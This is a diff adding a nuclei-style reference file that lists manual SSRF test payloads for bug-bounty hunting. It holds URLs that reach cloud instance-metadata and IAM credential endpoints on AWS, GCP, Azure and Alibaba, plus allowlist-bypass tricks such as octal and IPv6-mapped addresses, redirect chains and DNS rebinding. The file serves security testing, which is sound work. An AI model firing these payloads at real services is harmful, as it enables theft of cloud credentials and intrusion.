@@ -1,0 +1,24 @@
+id: cloud-metadata-ssrf-probe
+
+info:
+  name: Cloud Metadata SSRF Probe (manual-use param list)
+  author: BugLibrary
+  severity: info
+  description: >
+    Not an automated scanner template — this file documents the exact parameter
+    values to feed manually (Burp Repeater/Intruder) into any endpoint suspected
+    of SSRF (webhook URL, PDF/image generator, URL preview, import-from-URL) to
+    confirm cloud metadata access. Kept here for reference alongside the other
+    nuclei templates rather than as a standalone runnable check, since a false
+    positive here (blind SSRF, no reflected body) is common and needs manual
+    judgment. See docs/03-Web-Application-Hunting/03-SSRF.md.
+  tags: ssrf,cloud,manual
+
+# Reference payload values (use manually, not via `nuclei -t` on this file):
+#   AWS      : http://169.254.169.254/latest/meta-data/iam/security-credentials/
+#   AWS IMDSv2: requires PUT http://169.254.169.254/latest/api/token then X-aws-ec2-metadata-token header
+#   GCP      : http://metadata.google.internal/computeMetadata/v1/ (header: Metadata-Flavor: Google)
+#   Azure    : http://169.254.169.254/metadata/instance?api-version=2021-02-01 (header: Metadata: true)
+#   Alibaba  : http://100.100.100.200/latest/meta-data/
+#   Bypasses : http://[::ffff:169.254.169.254]/ , http://169.254.169.254.nip.io/ , http://0177.0.0.1/ (octal),
+#              redirect chain via attacker-controlled 302, DNS rebinding for TOCTOU past allowlist checks
